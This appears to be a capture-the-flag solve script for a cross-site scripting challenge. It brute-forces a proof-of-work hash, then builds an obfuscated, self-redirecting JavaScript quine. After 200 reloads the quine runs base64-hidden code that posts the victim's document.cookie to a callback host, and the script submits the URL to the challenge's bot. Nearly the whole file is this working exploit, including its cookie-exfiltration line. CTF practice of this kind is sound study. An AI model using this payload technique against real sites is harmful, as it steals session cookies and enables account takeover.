import requests
import hashlib
import itertools
import time
import argparse
import base64

parser = argparse.ArgumentParser()
parser.add_argument('--host', default="127.0.0.1", help="default: 127.0.0.1")
parser.add_argument('--port', type=int, default=8000, help="default: 8000")
parser.add_argument('--callback', default="127.0.0.1:8001", help="Callback host:port for flag (default: 127.0.0.1:8001)")
args = parser.parse_args()
chal_host = f"http://{args.host}:{args.port}/"
# js quine that increments counter param and redirects to challenge page on 200
callback = f"http://{args.callback}"


def build_sol(req_id):
    inner_js = f'$.post("{callback}",document.cookie)'
    inner_js_b64 = base64.b64encode(inner_js.encode()).decode().replace('=', '')
    js = f"/challenge?payload=eval(atob(`{inner_js_b64}`))"
    inner_js_b64 = base64.b64encode(js.encode()).decode().replace('=', '')
    js_encoded = f"atob(`{inner_js_b64}`)"
    sol = chal_host + """/playground?count=0&payload=(function%20$(){count=eval(`parseInt((new%20URL(window.location)).searchParams.get(String.fromCharCode(99,111,117,110,116)))${String.fromCharCode(43)}1`);if(count==200){window.location=""" + js_encoded + """};window.location=`/playground?count=${count}${String.fromCharCode(0x26)}payload=(${$}());`;}());"""
    print(len(sol))
    return sol

s = requests.Session()


r = s.get(chal_host)
content = r.text
req_id = content.split('/submit/')[1].split('"')[0]

hash_end = r.text.split('ends in ')[1][:6]
print(hash_end)
alpha = 'abcdefghijklmnopqrstuvwxyz'
alpha += alpha.upper()
alpha += '1234567890'
hash_input = ""
for i in itertools.permutations(alpha, 7):
    i = ''.join(i)
    h = hashlib.sha256(i.encode()).hexdigest()
    if h.endswith(hash_end):
        hash_input = i
        break

data = {'hash_input': hash_input, 'url': build_sol(req_id)}

r = s.post(f'{chal_host}/submit/{req_id}', data=data)
print(req_id)
print(r.text)


r = requests.get(f'{chal_host}/stream?channel={req_id}', stream=True)

for line in r.iter_lines():
    print(line)


